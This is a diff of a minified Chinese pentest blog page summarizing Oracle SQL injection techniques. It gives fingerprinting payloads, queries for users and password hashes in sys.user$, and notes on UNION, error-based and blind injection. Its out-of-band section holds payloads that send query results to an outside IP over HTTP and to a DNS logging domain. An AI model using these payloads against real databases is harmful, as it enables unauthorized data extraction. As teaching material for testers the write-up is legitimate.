@@ -1,131 +1,25 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="前几天渗透测试时遇到了Oracle的注入，这里简单总结一下Oracle中的SQL注入常见的利用手法：联合查询注入、报错型注入、布尔型注入、无返回值的盲注"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>SQL注入 tips(Oracle) | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>SQL注入 tips(Oracle)</h1>
-      
-<div class="post-meta">
-    <time>2019-01-04</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>,<a href="/tags/oracle">oracle</a>)
-</div>
-
-      <div><h3 id="0x00-判断数据库类型">0x00 判断数据库类型</h3>
-<ul>
-<li>
-<p>Oracle有一些自带的表：dual、user_tables</p>
-<ul>
-<li><code>id=45 and (select count(*) from user_tables)&gt;0--</code></li>
-<li><code>id=45 and (select count(*) from dual)&gt;0--</code></li>
-</ul>
-</li>
-<li>
-<p>利用自带的一些函数：譬如utl_http.request 这些</p>
-</li>
-<li>
-<p>利用Oracle的字符连接符：CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(49)||CHR(61)||CHR(49)</p>
-</li>
-</ul>
-<h3 id="0x01-基本信息获取">0x01 基本信息获取</h3>
-<ul>
-<li>查看sid</li>
-</ul>
-<pre tabindex="0"><code>select instance_name from v$instance;
-</code></pre><ul>
-<li>查看数据库版本：</li>
-</ul>
-<pre tabindex="0"><code>select banner from v$version where rownum=1;
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="前几天渗透测试时遇到了Oracle的注入，这里简单总结一下Oracle中的SQL注入常见的利用手法：联合查询注入、报错型注入、布尔型注入、无返回值的盲注"><meta name=author content="Reber"><title>SQL注入 tips(Oracle) | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>SQL注入 tips(Oracle)</h1><div class=post-meta><time>2019-01-04</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/SQL%E6%B3%A8%E5%85%A5>SQL注入</a>,<a href=/tags/oracle>oracle</a>)</div><div><h3 id=0x00-判断数据库类型>0x00 判断数据库类型</h3><ul><li><p>Oracle有一些自带的表：dual、user_tables</p><ul><li><code>id=45 and (select count(*) from user_tables)>0--</code></li><li><code>id=45 and (select count(*) from dual)>0--</code></li></ul></li><li><p>利用自带的一些函数：譬如utl_http.request 这些</p></li><li><p>利用Oracle的字符连接符：CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(49)||CHR(61)||CHR(49)</p></li></ul><h3 id=0x01-基本信息获取>0x01 基本信息获取</h3><ul><li>查看sid</li></ul><pre tabindex=0><code>select instance_name from v$instance;
+</code></pre><ul><li>查看数据库版本：</li></ul><pre tabindex=0><code>select banner from v$version where rownum=1;
 select banner from sys.v_$version where rownum=1;
-</code></pre><ul>
-<li>查看用户：</li>
-</ul>
-<pre tabindex="0"><code>select user from dual; --当前用户
+</code></pre><ul><li>查看用户：</li></ul><pre tabindex=0><code>select user from dual; --当前用户
 select username from user_users; --当前用户
 select username from all_users; --查看所有用户
 select username from dba_users; --查看所有用户(需要有权限)
-</code></pre><ul>
-<li>查看当前用户角色：</li>
-</ul>
-<pre tabindex="0"><code>select role from session_roles;
-</code></pre><ul>
-<li>查看数据库用户名和密码：</li>
-</ul>
-<pre tabindex="0"><code>select name, password, astatus from sys.user$; --需要权限
-</code></pre><ul>
-<li>通过注入获取数据
-<pre tabindex="0"><code>--列database
+</code></pre><ul><li>查看当前用户角色：</li></ul><pre tabindex=0><code>select role from session_roles;
+</code></pre><ul><li>查看数据库用户名和密码：</li></ul><pre tabindex=0><code>select name, password, astatus from sys.user$; --需要权限
+</code></pre><ul><li>通过注入获取数据<pre tabindex=0><code>--列database
 select global_name from global_name;
 select sys.database_name from dual;
 select name from v$database;
@@ -145,142 +39,42 @@ select tablespace_name from user_tablespaces;
 select table_name from user_tables where tablespace_name=&#39;DB_TEST_DATA&#39;;
 --列tables的columns
 select column_name from user_tab_columns where table_name=&#39;TUSER&#39;;
-</code></pre></li>
-</ul>
-<h3 id="0x02-union-query注入">0x02 UNION query注入</h3>
-<ul>
-<li>
-<p>存在注入
-<img src="/img/post/20190103-162239.png" alt="70"></p>
-</li>
-<li>
-<p>判断列数
-<img src="/img/post/20190103-162620.png" alt="40">
-<img src="/img/post/20190103-162720.png" alt="80"></p>
-</li>
-<li>
-<p>尝试union select
-<img src="/img/post/20190103-163005.png" alt="60">
+</code></pre></li></ul><h3 id=0x02-union-query注入>0x02 UNION query注入</h3><ul><li><p>存在注入
+<img src=/img/post/20190103-162239.png alt=70></p></li><li><p>判断列数
+<img src=/img/post/20190103-162620.png alt=40>
+<img src=/img/post/20190103-162720.png alt=80></p></li><li><p>尝试union select
+<img src=/img/post/20190103-163005.png alt=60>
 依次判断字段类型(下图判断出第二个字段是字符型)
-<img src="/img/post/20190103-163324.png" alt="80">
-<img src="/img/post/20190103-163228.png" alt="50"></p>
-</li>
-<li>
-<p>得到表名<br>
-得到表的个数
-<img src="/img/post/20190103-164019.png" alt="75">
+<img src=/img/post/20190103-163324.png alt=80>
+<img src=/img/post/20190103-163228.png alt=50></p></li><li><p>得到表名<br>得到表的个数
+<img src=/img/post/20190103-164019.png alt=75>
 得到第一个表的表名
-<img src="/img/post/20190103-163610.png" alt="75">
+<img src=/img/post/20190103-163610.png alt=75>
 得到第二个表的表名
-<img src="/img/post/20190103-164519.png" alt="75"></p>
-</li>
-<li>
-<p>得到第一个表的字段
-<img src="/img/post/20190103-165302.png" alt="80"></p>
-</li>
-<li>
-<p>得到第一个表的数据
-<img src="/img/post/20190103-170336.png" alt="80"></p>
-</li>
-</ul>
-<h3 id="0x03-error-based注入">0x03 error-based注入</h3>
-<ul>
-<li>
-<p>ctxsys.drithsx.sn
-<img src="/img/post/20190104-160714.png" alt="60"></p>
-</li>
-<li>
-<p>dbms_xdb_version.checkin
-<img src="/img/post/20190104-161325.png" alt="80"></p>
-</li>
-<li>
-<p>dbms_xdb_version.makeversioned
-<img src="/img/post/20190104-161521.png" alt="85"></p>
-</li>
-<li>
-<p>dbms_xdb_version.uncheckout
-<img src="/img/post/20190104-161727.png" alt="85"></p>
-</li>
-<li>
-<p>dbms_utility.sqlid_to_sqlhash
-<img src="/img/post/20190104-161838.png" alt="85"></p>
-</li>
-<li>
-<p>utl_inaddr.get_host_name(在11g以后需要是超级用户或已授予网络访问权限的用户才能使用)
-<img src="/img/post/20190104-203238.png" alt=""></p>
-</li>
-</ul>
-<h3 id="0x04-boolean-based-blind注入">0x04 boolean-based blind注入</h3>
-<ul>
-<li>
-<p>case&hellip;when&hellip;
-<img src="/img/post/Xnip2019-08-12_11-12-32.png" alt="65">
-<img src="/img/post/Xnip2019-08-12_11-13-46.png" alt="65"></p>
-</li>
-<li>
-<p>decode</p>
-</li>
-</ul>
-<p>decode(条件，值1，值1结果，值2，值2结果，。。。值n，值n结果，默认值)</p>
-<p>条件和那个值相等就返回那个值的结果
-<img src="/img/post/20190104-165737.png" alt="65">
-<img src="/img/post/20190104-165817.png" alt="65"></p>
-<ul>
-<li>instr</li>
-</ul>
-<p>instr(字符串，子串)</p>
-<p>从一个字符串中查找指定子串的位置，这里一直将位置置为1
-<img src="/img/post/20190104-201134.png" alt="55">
-<img src="/img/post/20190104-201157.png" alt="55">
-<img src="/img/post/20190104-201216.png" alt="55"></p>
-<h3 id="0x05-无回显注入">0x05 无回显注入</h3>
-<ul>
-<li>web服务接收结果</li>
-</ul>
-<pre tabindex="0"><code>select * from utest.msg where id=2 and 1=utl_http.request(&#39;http://59.108.35.198:8888/&#39;||(select user from dual));
-</code></pre><ul>
-<li>dns服务接收结果</li>
-</ul>
-<pre tabindex="0"><code>select * from utest.msg where id=2 and (select utl_inaddr.get_host_address((select user from dual)||&#39;.dnslog.wyb0.com&#39;) from dual) is not null;
-</code></pre><ul>
-<li>dns服务接收结果</li>
-</ul>
-<pre tabindex="0"><code>select * from utest.msg where id=2 and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#39;.dnslog.wyb0.com&#39;,81) from dual) is not null;
-</code></pre><h4 id="reference侵删">Reference(侵删)：</h4>
-<ul>
-<li><a href="https://www.freebuf.com/articles/web/5411.html?_blank">https://www.freebuf.com/articles/web/5411.html</a></li>
-<li><a href="https://www.iswin.org/2015/06/13/hack-oracle/?_blank">https://www.iswin.org/2015/06/13/hack-oracle/</a></li>
-<li><a href="https://www.freebuf.com/column/146464.html?_blank">https://www.freebuf.com/column/146464.html</a></li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+<img src=/img/post/20190103-164519.png alt=75></p></li><li><p>得到第一个表的字段
+<img src=/img/post/20190103-165302.png alt=80></p></li><li><p>得到第一个表的数据
+<img src=/img/post/20190103-170336.png alt=80></p></li></ul><h3 id=0x03-error-based注入>0x03 error-based注入</h3><ul><li><p>ctxsys.drithsx.sn
+<img src=/img/post/20190104-160714.png alt=60></p></li><li><p>dbms_xdb_version.checkin
+<img src=/img/post/20190104-161325.png alt=80></p></li><li><p>dbms_xdb_version.makeversioned
+<img src=/img/post/20190104-161521.png alt=85></p></li><li><p>dbms_xdb_version.uncheckout
+<img src=/img/post/20190104-161727.png alt=85></p></li><li><p>dbms_utility.sqlid_to_sqlhash
+<img src=/img/post/20190104-161838.png alt=85></p></li><li><p>utl_inaddr.get_host_name(在11g以后需要是超级用户或已授予网络访问权限的用户才能使用)
+<img src=/img/post/20190104-203238.png alt></p></li></ul><h3 id=0x04-boolean-based-blind注入>0x04 boolean-based blind注入</h3><ul><li><p>case&mldr;when&mldr;
+<img src=/img/post/Xnip2019-08-12_11-12-32.png alt=65>
+<img src=/img/post/Xnip2019-08-12_11-13-46.png alt=65></p></li><li><p>decode</p></li></ul><p>decode(条件，值1，值1结果，值2，值2结果，。。。值n，值n结果，默认值)</p><p>条件和那个值相等就返回那个值的结果
+<img src=/img/post/20190104-165737.png alt=65>
+<img src=/img/post/20190104-165817.png alt=65></p><ul><li>instr</li></ul><p>instr(字符串，子串)</p><p>从一个字符串中查找指定子串的位置，这里一直将位置置为1
+<img src=/img/post/20190104-201134.png alt=55>
+<img src=/img/post/20190104-201157.png alt=55>
+<img src=/img/post/20190104-201216.png alt=55></p><h3 id=0x05-无回显注入>0x05 无回显注入</h3><ul><li>web服务接收结果</li></ul><pre tabindex=0><code>select * from utest.msg where id=2 and 1=utl_http.request(&#39;http://59.108.35.198:8888/&#39;||(select user from dual));
+</code></pre><ul><li>dns服务接收结果</li></ul><pre tabindex=0><code>select * from utest.msg where id=2 and (select utl_inaddr.get_host_address((select user from dual)||&#39;.dnslog.wyb0.com&#39;) from dual) is not null;
+</code></pre><ul><li>dns服务接收结果</li></ul><pre tabindex=0><code>select * from utest.msg where id=2 and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#39;.dnslog.wyb0.com&#39;,81) from dual) is not null;
+</code></pre><h4 id=reference侵删>Reference(侵删)：</h4><ul><li><a href=https://www.freebuf.com/articles/web/5411.html?_blank>https://www.freebuf.com/articles/web/5411.html</a></li><li><a href=https://www.iswin.org/2015/06/13/hack-oracle/?_blank>https://www.iswin.org/2015/06/13/hack-oracle/</a></li><li><a href=https://www.freebuf.com/column/146464.html?_blank>https://www.freebuf.com/column/146464.html</a></li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
